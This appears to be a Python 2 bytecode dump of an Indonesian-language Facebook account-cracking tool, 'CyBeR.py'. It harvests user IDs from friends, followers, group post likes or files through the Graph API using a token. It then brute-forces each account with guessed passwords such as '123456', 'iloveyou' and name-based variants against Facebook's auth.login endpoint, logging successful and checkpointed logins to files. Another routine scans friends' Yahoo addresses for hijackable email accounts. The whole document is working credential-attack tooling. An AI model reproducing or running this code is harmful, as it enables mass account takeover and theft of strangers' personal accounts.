   NR   s	   login.txtR`   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;95m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;95m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;95m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R-   RE   RF   R\   Re   R   R   R   R0   t	   pilih_usa(    (    (    s   CyBeR.pyR�   �  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d! GHt �  d" t t t � � GHd# GHd$ d% d& g }
 x0 |
 D]( } d' | Gt j j �  t j d( � qWd) GHd* GHd+ �  } t d, � }
 |
 j | t � d- GHd. GHd/ t t t  � � d0 t t t! � � GHd1 GHd d GHt  d2 � t j d3 � d  S(4   Ns%   [1;95m︻デ═一▸ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar !R3   R4   R   i2   s
   [1;94m─sB                   [1;95m●●● [1;97mCRACK USA [1;95m●●●s3   https://graph.facebook.com/me/friends?access_token=R�   Ro   R5   R6   sB   [1;97m{[1;95m●[1;97m} [1;95mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m●[1;97m} [1;95mName [1;91m:[1;92m Rn   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;95m[[1;97m<Kembali>[1;95m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=Ru   Rv   s<   [1;97m{[1;95m●[1;97m} [1;95mName File[1;91m :[1;92m R`   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R7   R8   s.   [1;97m[[1;91m![1;97m][1;97m Isi Yg Benar !s;   [1;97m{[1;95m●[1;97m} [1;95mTotal ID [1;91m:[1;92m s3   [1;97m{[1;95m●[1;97m} [1;95mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;95m●[1;97m} [1;95mCrack Berjalan i   sL   
[1;97m{[1;95m●[1;97m} [1;95mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c   
      S   s�  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xyut j d | d t
 � } t j | j � } d } t j d | d | d	 � } t j | � } d
 | k rFd GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n�d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � nd }	 t j d | d |	 d	 � } t j | � } d
 | k r�d GHd | d
 GHd | GHd |	 GHt d d � } | j d | d
 d | d |	 d � | j �  t j | � nRd | d k rd GHd | d
 GHd | GHd |	 GHt d d � } | j d | d
 d | d |	 d � | j �  t j | � n�| d d }
 t j d | d |
 d	 � } t j | � } d
 | k r�d GHd | d
 GHd | GHd |
 GHt d d � } | j d | d
 d | d |
 d � | j �  t j | � nd | d k rLd GHd | d
 GHd | GHd |
 GHt d d � } | j d | d
 d | d |
 d � | j �  t j | � n�| d d  } t j d | d | d	 � } t j | � } d
 | k r
d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n�d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � nD| d d! } t j d | d | d	 � } t j | � } d
 | k rNd GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n� d | d k r�d GHd | d
 GHd | GHd | GHt d d � } | j d | d
 d | d | d � | j �  t j | � n  Wn n Xd  S("   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SR	   s   https://graph.facebook.com/s   /?access_token=t   iloveyous�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R�   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/usa.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comR�   s*   
[1;97m{[1;95m×[1;97m} [1;95mCEKPOINTs4   [1;97m{[1;95m×[1;97m} Name  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} User  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} Password  [1;91m> [1;95ms    
{×} TEKIN CP 
{×} Name     > t   123456R�   R�   R�   R�   (   R
   R   R   RL   R   R�   R�   R
   R   R�   R�   RO   RJ   R\   RV   RW   RX   R�   R�   R�   RE   RY   R�   R�   R�   (
   R�   R�   R�   R%   R�   R�   R�   R�   RR   R�   R�   R�   R�   (    (    s   CyBeR.pyR�   +  s�    ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;95m●[1;97m} [1;95mSelesai ...sS   [1;97m{[1;95m●[1;97m} [1;95mTotal [1;92mOK[1;97m/[1;95mCP [1;97m: [1;92ms   [1;97m/[1;95msh   [1;97m{[1;95m●[1;97m} [1;92mOK[1;97m/[1;95mCP [1;95mfile tersimpan [1;91m: [1;92mdone/usa.txts    [1;97m{<[1;95mKembali[1;97m>}s   python2 CyBeR.py("   R9   R�   R   R-   R0   RO   RJ   R\   RV   RW   RX   Ro   R�   R[   R�   Rp   R   R   RE   R�   R�   Re   Rg   R$   R   R
   R   R
   R   R   R    R�   R�   R�   (   R�   R`   R&   R�   R�   t   jokt   opR    R�   R�   R�   R�   R�   R�   (    (    s   CyBeR.pyR�   �  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtR`   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;91m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;91m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;91m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R-   RE   RF   R\   Re   R   R   R   R0   t   pilih_pakis(    (    (    s   CyBeR.pyR�   �  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d GHt �  d! t t t � � GHd" GHd# d$ d% g }
 x0 |
 D]( } d& | Gt j j �  t j d' � qWd( GHd) GHd* �  } t d+ � }
 |
 j | t � d, GHd- GHd. t t t  � � d/ t t t! � � GHd0 GHd d GHt  d1 � t j d2 � d  S(3   Ns%   [1;91m︻デ═一▸ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar !R3   R4   R   i2   s
   [1;94m─sD                [1;91m●●● [1;97mCRACK PAKISTAN [1;91m●●●s3   https://graph.facebook.com/me/friends?access_token=R�   Ro   R5   R6   sB   [1;97m{[1;91m●[1;97m} [1;91mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;91m●[1;97m} [1;91mName [1;91m:[1;92m Rn   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;91m[[1;97m<Kembali>[1;91m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=Ru   Rv   s<   [1;97m{[1;91m●[1;97m} [1;91mName File[1;91m :[1;92m R`   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R7   R8   s;   [1;97m{[1;91m●[1;97m} [1;91mTotal ID [1;91m:[1;92m s3   [1;97m{[1;91m●[1;97m} [1;91mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;91m●[1;97m} [1;91mCrack Berjalan i   sL   
[1;97m{[1;91m●[1;97m} [1;91mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c         S   s�
  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xye
t j d | d t
 � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � np	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n&d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�| d j �  d }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nVd  } t j d | d	 | d
 � } t j | � } d | k r$d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d! GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd" } t j d | d	 | d
 � } t j | � } d | k r`d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � ndd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d# j �  d$ }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nd | d k r0d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rz	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r>
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d% GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S(&   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SR	   s   https://graph.facebook.com/s   /?access_token=R�   R�   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R�   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/pakis.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comR�   s*   
[1;97m{[1;91m×[1;97m} [1;91mCEKPOINTs4   [1;97m{[1;91m×[1;97m} Name  [1;91m    > [1;91ms4   [1;97m{[1;91m×[1;97m} User  [1;91m    > [1;91ms4   [1;97m{[1;91m×[1;97m} Password  [1;91m> [1;91ms    
{×} CEKPOINT 
{×} Name     > R�   R�   t   pakistans*   
[1;97m{[1;93m×[1;97m} [1;91mCEKPOINTR�   R�   R�   s*   
[1;97m{[1;91m×[1;97m} [1;93mCEKPOINT(   R
   R   R   RL   R   R�   R�   R
   R   R�   R�   RO   RJ   R\   RV   RW   RX   R�   R�   R�   R�   RE   RY   R�   R�   R�   (   R�   R�   R�   R%   R�   R�   R�   R�   RR   R�   R�   R�   R�   R�   R�   R�   (    (    s   CyBeR.pyR�     sh   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;91m●[1;97m} [1;91mSelesai ...sS   [1;97m{[1;91m●[1;97m} [1;91mTotal [1;92mOK[1;97m/[1;91mCP [1;97m: [1;92ms   [1;97m/[1;91msj   [1;97m{[1;91m●[1;97m} [1;92mOK[1;97m/[1;91mCP [1;91mfile tersimpan [1;91m: [1;92mdone/pakis.txts    [1;97m{<[1;91mKembali[1;97m>}s   python2 CyBeR.py("   R9   R�   R   R-   R0   RO   RJ   R\   RV   RW   RX   Ro   R�   R[   R�   Rp   R   R   RE   R�   R�   Re   Rg   R$   R   R
   R   R
   R   R   R    R�   R�   R�   (   R�   R`   R&   R�   R�   R�   R�   R    R�   R�   R�   R�   R�   R�   (    (    s   CyBeR.pyR�   �  s�    

		
		



		





 
 	�)	
c             s
  t  j d � y t d d � j �  �  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy� t  j d � t GHd d GHd	 GHd d GHt	 d
 � }  t
 j d |  d �  � } t j
 | j � } x# | d
 D] } t j | d � q� Wt d � Wn' t k
 rd GHt	 d � t �  n Xd t t t � � GHd GHd d d g } x0 | D]( } d | Gt j j �  t j d � qPWd GHd GH�  f d �  } t d � } | j | t � d GHd GHd t t t � � d  t t t � � GHd! GHd d GHt	 d" � t  j d# � d  S($   NR   s	   login.txtR`   s   [1;97m[!] Token invalids   rm -rf login.txtg{�G�z�?i2   s
   [1;94m─sK           [1;96m●●● [1;97mCRACK POSTINGAN GRUP/TEMAN[1;96m ●●●sL   [1;97m{[1;96m●[1;97m}[1;96m ID Postingan Group/Teman [1;91m :[1;92m s   https://graph.facebook.com/s"   /likes?limit=9999999&access_token=R�   Ro   s:   
[1;97m{[1;96m●[1;97m} [1;96mMengambil ID [1;97m...s-   [1;97m{[1;91m![1;97m} ID Postingan Salah !s!   
[1;96m[<[1;97mKembali>[1;96m]s;   [1;97m{[1;96m●[1;97m} [1;96mTotal ID [1;91m:[1;92m s3   [1;97m{[1;96m●[1;97m} [1;96mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;96m●[1;97m} [1;96mCrack Berjalan i   sL   
[1;97m{[1;96m●[1;97m} [1;96mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c            s[  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xy�t j d | d �  � } t
 j | j � } | d j �  d } t j d | d	 | d
 � } t
 j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nr| d j �  d }	 t j d | d	 |	 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n(| d j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � ndd | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r2d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r|d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rd GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d  j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n� d | d k rLd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n  Wn n Xd  S(!   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SR	   s   https://graph.facebook.com/s   /?access_token=R�   R�   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R�   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms
   done/grup.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comR�   s*   
[1;97m{[1;96m×[1;97m} [1;96mCEKPOINTs4   [1;97m{[1;96m×[1;97m} Name  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} User  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} Password  [1;91m> [1;96ms    
{×} TEKIN CP
{×} Name     > R�   R�   R�   (   R
   R   R   RL   R   R�   R�   R
   R   R�   R�   RO   RJ   RV   RW   RX   R�   R�   R�   R�   RE   RY   R�   R�   R�   (   R�   R�   R�   R%   R�   R�   R�   R�   RR   R�   R�   R�   R�   R�   (   R\   (    s   CyBeR.pyR�     s   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;96m●[1;97m} [1;96mSelesai ...sS   [1;97m{[1;96m●[1;97m} [1;96mTotal [1;92mOK[1;97m/[1;96mCP [1;97m: [1;92ms   [1;97m/[1;96msi   [1;97m{[1;96m●[1;97m} [1;92mOK[1;97m/[1;96mCP [1;96mfile tersimpan [1;91m: [1;92mdone/grup.txts    [1;97m{<[1;96mKembali[1;97m>}s   python2 CyBeR.py(   R   R-   RE   RF   Re   R   R   R.   R0   R9   RO   RJ   RV   RW   RX   Ro   R�   R(   R[   Rg   R$   R   R
   R   R
   R    R�   R�   R�   (   t   tezR`   R&   R    R�   R�   R�   R�   (    (   R\   s   CyBeR.pyR~   �  sV    




		


 
 �)	
c    
         s  t  d d � j �  �  t j d � t GHd d GHd GHd d GHt d � }  y> t j d |  d	 �  � } t j	 | j
 � } d
 | d GHWnI t k
 r� d GHt d
 � t �  n# t j
 j k
 r� d GHt �  n Xt j d |  d �  � } t j	 | j
 � } x# | d D] } t j | d � qWd t t t � � GHd GHd d d g } x0 | D]( } d | Gt j j �  t j d � qWWd GHd GH�  f d �  } t d � }	 |	 j | t � d GHd GHd t t t � � d  t t t � � GHd! GHd d GHt d" � t j d# � d  S($   Ns	   login.txtR`   R   i2   s
   [1;94m─sF                 [1;95m●●● [1;97mCRACK FOLLOWERS [1;95m●●●sB   [1;97m{[1;95m●[1;97m} [1;95mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m●[1;97m} [1;95mName [1;91m:[1;92m Rn   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;95m[[1;97m<Kembali>[1;95m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s'   /subscribers?limit=999999&access_token=R�   Ro   sE   [1;97m{[1;95m●[1;97m} [1;95mTotal ID Followers [1;91m:[1;92m s3   [1;97m{[1;95m●[1;97m} [1;95mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;95m●[1;97m} [1;95mCrack Berjalan i   sL   
[1;97m{[1;95m●[1;97m} [1;95mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c            s[  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xy�t j d | d �  � } t
 j | j � } | d j �  d } t j d | d	 | d
 � } t
 j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nr| d j �  d }	 t j d | d	 |	 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n(| d j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � ndd | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r2d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r|d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rd GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d  j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n� d | d k rLd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n  Wn n Xd  S(!   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SR	   s   https://graph.facebook.com/s   /?access_token=R�   R�   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R�   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/follow.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comR�   s*   
[1;97m{[1;95m×[1;97m} [1;95mCEKPOINTs4   [1;97m{[1;95m×[1;97m} Name  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} User  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} Password  [1;91m> [1;95ms    
{×} TEKIN CP
{×} Name     > R�   R�   R�   (   R
   R   R   RL   R   R�   R�   R
   R   R�   R�   RO   RJ   RV   RW   RX   R�   R�   R�   R�   RE   RY   R�   R�   R�   (   R�   R�   R�   R%   R�   R�   R�   R�   RR   R�   R�   R�   R�   R�   (   R\   (    s   CyBeR.pyR�   �  s   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;95m●[1;97m} [1;95mSelesai ...sS   [1;97m{[1;95m●[1;97m} [1;95mTotal [1;92mOK[1;97m/[1;95mCP [1;97m: [1;92ms   [1;97m/[1;95msk   [1;97m{[1;95m●[1;97m} [1;92mOK[1;97m/[1;95mCP [1;95mfile tersimpan [1;91m: [1;92mdone/follow.txts    [1;97m{<[1;95mKembali[1;97m>}s   python2 cr4ck.py(   RE   RF   R   R-   R0   R9   RO   RJ   RV   RW   RX   R[   Rg   Rp   R   R   Ro   R�   R$   R   R
   R   R
   R   R   R    R�   R�   R�   (
   R�   R�   R�   R`   R&   R    R�   R�   R�   R�   (    (   R\   s   CyBeR.pyR   �  sR    
		



 
 �)	
c          C   su   t  j d � t GHd d GHd }  |  t d � } t j d � } t j | � } | j | j	 � GHt d � t
 �  d  S(   NR   i2   s
   [1;94m─s   https://www.facebook.com/s%   [1;97m{[1;95m×[1;97m} Username : s   "entity_id":"([0-9]+)"s!   
[1;95m[[1;97m<Kembali>[1;95m](   R   R-   R0   R9   t   ret   compileRO   RJ   t   findallRN   Rg   (   t   lingt   urlt   idret   page(    (    s   CyBeR.pyR�   l  s    
	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd
 GHt
 �  d  S(   NR   s	   login.txtR`   s   [1;91m[!] Token invalids   rm -rf login.txti   i*   s   [1;96m=s(   [1;97m1.[1;93m Clone dari daftar temans!   [1;97m2.[1;93m Clone dari temans(   [1;97m3.[1;93m Clone dari member groups    [1;97m4.[1;93m Clone dari files   
[1;91m0.[1;91m Kembali(   R   R-   RE   RF   R\   Re   R   R   R   R0   t   clone(    (    (    s   CyBeR.pyR�   y  s"    




	c          C   s�   t  d � }  |  d k r  d GHns |  d k r6 t �  n] |  d k rL t �  nG |  d k rb t �  n1 |  d k rx t �  n |  d k r� t �  n d GHd  S(	   Ns
   
[1;97m >>> R   s    [1;96m[!] [1;91mIsi yang benarR3   R5   Ru   Rw   R7   (   R9   t   clone_dari_daftar_temant   clone_dari_temant   clone_dari_member_groupt   clone_dari_fileRg   (   t   embuh(    (    s   CyBeR.pyR�   �  s    




c          C   s�  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d	 } d
 d GHt d � t
 j d
 t � } t j | j � } t d � d GHd
 d GHx�| d D]�} | d 7} |  j | � | d } | d } t
 j d | d t � } t j | j � } y9| d }	 t j d � }
 |
 j |	 � j �  } d | k r�t j d � t t j _ t j d d	 � |	 t d <t j �  j �  } t j d � }
 y |
 j | � j �  } Wn
 w� n Xd | k r�d GHd | GHd |	 GHd  t d! GHt d" d# � } | j d$ t d% | d& |	 d' � | j �  t  j |	 � q�n  Wq� t! k
 r�q� Xq� Wd
 d GHd( GHd) t" t# t  � � GHd* GHt$ d+ � t% �  d  S(,   Nt   resets	   login.txtR`   s   [1;91m[!] Token Invalids   rm -rf login.txti   t   outR   i    i*   s   [1;96m=s<   [1;96m[[1;97m✺[1;96m] [1;93mMengambil email [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s2   [1;96m[[1;97m✺[1;96m] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zR�   Ro   Rn   s   https://graph.facebook.com/s   ?access_token=t   emails   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comt   nrt   usernames$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   [1;96m[✓] [1;92mVULNs)   [1;96m[➹] [1;97mID   [1;91m: [1;92ms)   [1;96m[➹] [1;97mEmail[1;91m: [1;92ms)   [1;96m[➹] [1;97mName [1;91m: [1;92ms   
s   out/MailVuln.txtRA   s   Name : s
   
ID        : s
   
Email  : s   

s5   [1;96m[[1;97m✓[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msA   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/MailVuln.txts   
[1;96m[[1;97mKembali[1;96m](&   R   R-   RE   RF   R\   Re   R   R   R   R�   R�   R0   R(   RO   RJ   RV   RW   RX   R�   R�   R�   t   searcht   groupt   brt   Truet   _factoryt   is_htmlt   select_formt   submitRn   R   RY   t   berhasilR[   R$   R   R9   Rg   (   t   mpsht   jmlt   temant   kimakR   Ro   Rt   t   linksR&   t   mailR�   R]   t   klikR�   t   pekt   save(    (    s   CyBeR.pyR�   �  s|    





	

	






		
%

	
c           C   sI   t  j d � t GHd GHt d � t  j d � t d � t  j d � d  S(   NR   s�   [1;94m──────────────────────────────────────────────────s$   [1;92mMemperbarui Script ...[1;93ms   git pull origin masters!   
[1;94m{[1;97m<Kembali>[1;94m}s   python2 CyBeR.py(   R   R-   R0   R(   R9   (    (    (    s   CyBeR.pyR�   �  s    



